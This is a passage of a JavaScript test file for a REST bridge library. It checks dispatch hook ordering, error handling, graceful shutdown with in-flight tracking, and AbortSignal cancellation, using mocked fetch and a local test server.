            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      let caught;
      try {
        await bridge.dispatch('list_items', {});
      } catch (err) {
        caught = err;
      }
      assert.ok(caught, 'dispatch must throw on upstream 5xx');
      assert.equal(observed.length, 1);
      assert.equal(observed[0].result, undefined);
      assert.ok(observed[0].error, 'afterDispatch context.error must be set on failure');
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('firing order: beforeDispatch -> beforeRequest -> afterRequest -> afterDispatch', async () => {
    const fetcher = mockFetch(200, { ok: true });
    globalThis.fetch = fetcher;

    const log = [];
    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        hooks: {
          beforeDispatch: async () => { log.push('beforeDispatch'); },
          beforeRequest: async () => { log.push('beforeRequest'); },
          afterRequest: async () => { log.push('afterRequest'); },
          afterDispatch: async () => { log.push('afterDispatch'); },
        },
        tools: [
          {
            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      await bridge.dispatch('list_items', {});
      // afterRequest may or may not be wired in the current client —
      // assert only on the pair the bridge drives. beforeDispatch MUST
      // come before beforeRequest, and afterDispatch MUST be last.
      const firstDispatch = log.indexOf('beforeDispatch');
      const firstRequest = log.indexOf('beforeRequest');
      const lastDispatch = log.lastIndexOf('afterDispatch');
      assert.ok(firstDispatch >= 0, 'beforeDispatch must fire');
      assert.ok(firstRequest >= 0, 'beforeRequest must fire');
      assert.ok(lastDispatch >= 0, 'afterDispatch must fire');
      assert.ok(firstDispatch < firstRequest, 'beforeDispatch must fire before beforeRequest');
      assert.equal(log[log.length - 1], 'afterDispatch', 'afterDispatch must be last');
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('afterDispatch throwing does NOT break dispatch (caller still receives the result)', async () => {
    const fetcher = mockFetch(200, { value: 'ok' });
    globalThis.fetch = fetcher;

    // Silence the expected stderr complaint so the test output stays clean.
    const origWrite = process.stderr.write.bind(process.stderr);
    const stderrWrites = [];
    process.stderr.write = (chunk, ..._rest) => {
      stderrWrites.push(String(chunk));
      return true;
    };

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        hooks: {
          afterDispatch: async () => { throw new Error('observability hook died'); },
        },
        tools: [
          {
            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      const result = await bridge.dispatch('list_items', {});
      assert.deepEqual(result, { value: 'ok' }, 'caller must still receive the dispatch result');
      assert.ok(
        stderrWrites.some((s) => s.includes('afterDispatch')),
        'afterDispatch failure must be logged to stderr',
      );
    } finally {
      process.stderr.write = origWrite;
      globalThis.fetch = originalFetch;
    }
  });

  it('beforeDispatch throwing propagates to caller; dispatch body did not run', async () => {
    const fetcher = mockFetch(200, { value: 'unreachable' });
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        hooks: {
          beforeDispatch: async () => { throw new Error('policy denied'); },
        },
        tools: [
          {
            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      let caught;
      try {
        await bridge.dispatch('list_items', {});
      } catch (err) {
        caught = err;
      }
      assert.ok(caught, 'beforeDispatch throw must propagate');
      assert.match(caught.message, /policy denied/);
      assert.equal(fetcher.mock.calls.length, 0, 'dispatch body (HTTP fetch) must not run');
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
});

describe('createRestBridge — graceful shutdown', () => {
  let originalFetch;
  beforeEach(() => {
    originalFetch = globalThis.fetch;
  });

  function simpleBridge(hooks) {
    return createRestBridge({
      name: 'shutdown-test',
      baseUrl: 'http://localhost:9999',
      hooks,
      tools: [
        {
          name: 'get_thing',
          description: 'Get a thing',
          method: 'GET',
          path: '/api/thing',
          inputSchema: { type: 'object', properties: {} },
        },
      ],
    });
  }

  it('refuses new dispatches after close() with a structured SHUTTING_DOWN error', async () => {
    globalThis.fetch = mockFetch(200, { ok: true });
    try {
      const bridge = simpleBridge();
      await bridge.close();

      let caught;
      try {
        await bridge.dispatch('get_thing', {});
      } catch (err) {
        caught = err;
      }
      assert.ok(caught, 'dispatch must throw after close()');
      assert.equal(caught.bridgeCode, BridgeErrorCode.SHUTTING_DOWN);
      assert.match(caught.message, /shutting down/i);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('awaits in-flight dispatches before resolving close()', async () => {
    // Fetch resolves only when we release the gate. close() must not
    // resolve before the dispatch does.
    let release;
    const gate = new Promise((resolve) => { release = resolve; });
    globalThis.fetch = mock.fn(async () => {
      await gate;
      return {
        ok: true,
        status: 200,
        json: async () => ({ ok: true }),
        text: async () => JSON.stringify({ ok: true }),
      };
    });
    try {
      const bridge = simpleBridge();
      const dispatchPromise = bridge.dispatch('get_thing', {});

      // Give the dispatch one microtask tick to register in the in-flight set.
      await new Promise((r) => setImmediate(r));

      let closeResolved = false;
      const closePromise = bridge.close({ timeoutMs: 5_000 }).then(() => {
        closeResolved = true;
      });

      // Give close() a chance to run; it must still be pending.
      await new Promise((r) => setImmediate(r));
      assert.equal(closeResolved, false, 'close() must not resolve while a dispatch is in-flight');

      // Let the dispatch finish, then close() should drain and resolve.
      release();
      await dispatchPromise;
      await closePromise;
      assert.equal(closeResolved, true, 'close() must resolve once in-flight dispatches drain');
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('emits bridge.shutdown_timeout audit event when timeoutMs elapses', async () => {
    // fetch never resolves → dispatch hangs → timeout path fires.
    let release;
    globalThis.fetch = mock.fn(() => new Promise((r) => { release = r; }));

    const origWrite = process.stderr.write.bind(process.stderr);
    const writes = [];
    process.stderr.write = (chunk) => {
      writes.push(String(chunk));
      return true;
    };

    try {
      const bridge = simpleBridge();
      // Kick off a dispatch that will never settle on its own.
      const pending = bridge.dispatch('get_thing', {}).catch(() => {});
      // Ensure the in-flight registration happens before close().
      await new Promise((r) => setImmediate(r));

      const start = Date.now();
      await bridge.close({ timeoutMs: 50 });
      const elapsed = Date.now() - start;
      assert.ok(elapsed < 1_000, `close() must resolve near timeoutMs (took ${elapsed}ms)`);

      const auditLines = writes.filter((w) => w.includes('bridge.shutdown_timeout'));
      assert.ok(auditLines.length >= 1, 'bridge.shutdown_timeout audit must be emitted');
      const parsed = JSON.parse(auditLines[0].replace(/^\[40mcp:audit\]\s*/, '').trim());
      assert.equal(parsed.event, 'bridge.shutdown_timeout');
      assert.ok(parsed.inFlightCount >= 1, 'audit must report at least one in-flight dispatch');

      // Unblock the abandoned fetch so node doesn't hold the event loop open.
      if (release) release({
        ok: true,
        status: 200,
        json: async () => ({}),
        text: async () => '{}',
      });
      await pending;
    } finally {
      process.stderr.write = origWrite;
      globalThis.fetch = originalFetch;
    }
  });

  it('close() is idempotent — second call returns the same promise as the first', async () => {
    globalThis.fetch = mockFetch(200, { ok: true });
    try {
      const bridge = simpleBridge();
      const p1 = bridge.close();
      const p2 = bridge.close();
      assert.strictEqual(p1, p2, 'second close() must return the same promise as the first');
      await p1;
      // A third call after the first has settled must still be idempotent.
      const p3 = bridge.close();
      assert.strictEqual(p3, p1);
      await p3;
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('composes with user-provided beforeDispatch/afterDispatch hooks (both fire, in-flight tracked)', async () => {
    // Gate fetch so we can observe in-flight state mid-dispatch.
    let release;
    const gate = new Promise((resolve) => { release = resolve; });
    globalThis.fetch = mock.fn(async () => {
      await gate;
      return {
        ok: true,
        status: 200,
        json: async () => ({ ok: true }),
        text: async () => JSON.stringify({ ok: true }),
      };
    });

    const userHookCalls = { before: 0, after: 0 };
    const bridge = simpleBridge({
      beforeDispatch: async () => { userHookCalls.before += 1; },
      afterDispatch: async () => { userHookCalls.after += 1; },
    });

    try {
      const dispatchPromise = bridge.dispatch('get_thing', {});
      // Give the dispatch path a chance to run beforeDispatch + register
      // in-flight tracking before we inspect close() behaviour.
      await new Promise((r) => setImmediate(r));

      assert.equal(userHookCalls.before, 1, 'user beforeDispatch must fire');

      // Bridge's in-flight tracking must now be non-empty: close() should
      // NOT resolve until the dispatch settles.
      let closeSettled = false;
      const closePromise = bridge.close({ timeoutMs: 5_000 }).then(() => {
        closeSettled = true;
      });
      await new Promise((r) => setImmediate(r));
      assert.equal(closeSettled, false, 'close() must await the in-flight dispatch');

      release();
      await dispatchPromise;
      await closePromise;

      assert.equal(userHookCalls.after, 1, 'user afterDispatch must fire exactly once');
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
});

// ─── Tool cancellation via AbortSignal ──────────────────────────────────────

describe('dispatch cancellation', () => {
  let originalFetch;

  beforeEach(() => {
    originalFetch = globalThis.fetch;
  });

  it('pre-aborted signal rejects with ABORTED and makes no HTTP request', async () => {
    const fetcher = mockFetch(200, { should: 'not-happen' });
    globalThis.fetch = fetcher;

    const observed = [];
    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        hooks: {
          afterDispatch: async (toolName, result, context) => {
            observed.push({ toolName, result, error: context?.error });
          },
        },
        tools: [
          {
            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      const controller = new AbortController();
      controller.abort(new Error('client gave up'));

      let caught;
      try {
        await bridge.dispatch('list_items', {}, { signal: controller.signal });
      } catch (err) {
        caught = err;
      }
      assert.ok(caught, 'dispatch must throw on pre-aborted signal');
      assert.equal(caught.bridgeCode, 'ABORTED', 'error must carry bridgeCode ABORTED');
      assert.match(caught.message, /dispatch aborted/, 'message must include "dispatch aborted"');
      assert.equal(
        fetcher.mock.calls.length,
        0,
        'no HTTP fetch must occur when signal is pre-aborted',
      );
      // afterDispatch still fires so OTEL spans close.
      assert.equal(observed.length, 1);
      assert.equal(observed[0].result, undefined);
      assert.ok(observed[0].error, 'afterDispatch must see the abort error');
      assert.equal(observed[0].error.bridgeCode, 'ABORTED');
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('mid-flight abort rejects with ABORTED and closes the upstream socket', async () => {
    // Real HTTP server: slow response so we have a window to abort.
    const incomingSockets = [];
    let socketsClosed = 0;
    const pendingTimers = [];
    let onRequestReceived;
    const requestReceived = new Promise((resolve) => { onRequestReceived = resolve; });
    const server = http.createServer((req, res) => {
      incomingSockets.push(req.socket);
      req.socket.on('close', () => { socketsClosed += 1; });
      onRequestReceived();
      // Never finish — hold the connection until it's aborted.
      const t = setTimeout(() => {
        try { res.end(JSON.stringify({ late: true })); } catch { /* ignore */ }
      }, 2000);
      pendingTimers.push(t);
      req.on('close', () => clearTimeout(t));
    });
    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
    const { port } = server.address();

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: `http://127.0.0.1:${port}`,
        tools: [
          {
            name: 'slow_items',
            description: 'Slow endpoint',
            method: 'GET',
            path: '/slow',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      const controller = new AbortController();
      // Abort after the server has observed the request — time-based races were
      // flaky on fast Linux TCP stacks where 20ms fired before connect completed.
      requestReceived.then(() => controller.abort(new Error('client timeout')));

      const t0 = Date.now();
      let caught;
      try {
        await bridge.dispatch('slow_items', {}, { signal: controller.signal });
      } catch (err) {
        caught = err;
      }
      const elapsed = Date.now() - t0;

      assert.ok(caught, 'dispatch must reject on mid-flight abort');
      assert.equal(caught.bridgeCode, 'ABORTED');
      assert.ok(
        elapsed < 200,
        `dispatch must abort well before upstream finishes (took ${elapsed}ms)`,
      );
      // Give the server socket a tick to observe the close event.
      await new Promise((resolve) => setTimeout(resolve, 20));
      assert.ok(
        incomingSockets.length >= 1,
        'upstream must have received at least one request',
      );
      assert.ok(
        socketsClosed >= 1,
        'upstream socket must be closed by the aborted client',
      );
    } finally {
      for (const t of pendingTimers) clearTimeout(t);
      if (typeof server.closeAllConnections === 'function') {
        server.closeAllConnections();
      }
      await new Promise((resolve) => server.close(() => resolve()));
    }
  });

  it('afterDispatch fires on mid-flight abort with context.error = BridgeError(ABORTED)', async () => {
    const pendingTimers = [];
    const server = http.createServer((req, res) => {
      // Hold the connection — we want the abort to fire mid-flight.
      const t = setTimeout(() => { try { res.end('{}'); } catch { /* ignore */ } }, 2000);
      pendingTimers.push(t);
      req.on('close', () => clearTimeout(t));
    });
    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
    const { port } = server.address();

    const observed = [];
    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: `http://127.0.0.1:${port}`,
        hooks: {
          afterDispatch: async (toolName, result, context) => {
            observed.push({ toolName, result, error: context?.error });
          },
        },
        tools: [
          {
            name: 'slow_items',
            description: 'Slow endpoint',
            method: 'GET',
            path: '/slow',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      const controller = new AbortController();
      setTimeout(() => controller.abort(), 20);

      let caught;
      try {
        await bridge.dispatch('slow_items', {}, { signal: controller.signal });
      } catch (err) {
        caught = err;
      }
      assert.ok(caught);
      assert.equal(caught.bridgeCode, 'ABORTED');
      assert.equal(observed.length, 1, 'afterDispatch must fire exactly once');
      assert.equal(observed[0].result, undefined, 'no result on abort');
      assert.ok(observed[0].error, 'context.error must be set');
      assert.equal(
        observed[0].error.bridgeCode,
        'ABORTED',
        'afterDispatch must see BridgeError(ABORTED)',
      );
    } finally {
      for (const t of pendingTimers) clearTimeout(t);
      if (typeof server.closeAllConnections === 'function') {
        server.closeAllConnections();
      }
      await new Promise((resolve) => server.close(() => resolve()));
    }
  });

  it('no signal in options = unchanged behaviour (completes normally)', async () => {
    const fetcher = mockFetch(200, { value: 99 });
    globalThis.fetch = fetcher;

    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        tools: [
          {
            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      // Explicit no-signal call — must complete as if the option didn't exist.
      const result = await bridge.dispatch('list_items', {}, {});
      assert.deepEqual(result, { value: 99 });
      assert.equal(fetcher.mock.calls.length, 1);
      const [, init] = fetcher.mock.calls[0].arguments;
      // The fetch still carries an AbortSignal from the internal timeout
      // controller — that's unchanged behaviour, not a regression.
      assert.ok(init.signal instanceof AbortSignal);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it('signal passed but never aborted: dispatch completes, afterDispatch fires with result', async () => {
    const fetcher = mockFetch(200, { ok: true });
    globalThis.fetch = fetcher;

    const observed = [];
    try {
      const bridge = createRestBridge({
        name: 'test',
        baseUrl: 'http://localhost:9999',
        hooks: {
          afterDispatch: async (toolName, result, context) => {
            observed.push({ toolName, result, error: context?.error });
          },
        },
        tools: [
          {
            name: 'list_items',
            description: 'List items',
            method: 'GET',
            path: '/api/items',
            inputSchema: { type: 'object', properties: {} },
          },
        ],
      });

      const controller = new AbortController(); // never aborted
      const result = await bridge.dispatch(
        'list_items',
        {},
        { signal: controller.signal },
      );
      assert.deepEqual(result, { ok: true });
      assert.equal(observed.length, 1);
      assert.equal(observed[0].error, undefined, 'no error when signal is not aborted');
      assert.deepEqual(observed[0].result, { ok: true });

      // The outbound fetch must have been wired with a signal (composed or
      // external). Assert it's still an AbortSignal — precise identity is
      // runtime-dependent (AbortSignal.any when available, external otherwise).
      const [, init] = fetcher.mock.calls[0].arguments;
      assert.ok(init.signal instanceof AbortSignal);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
});

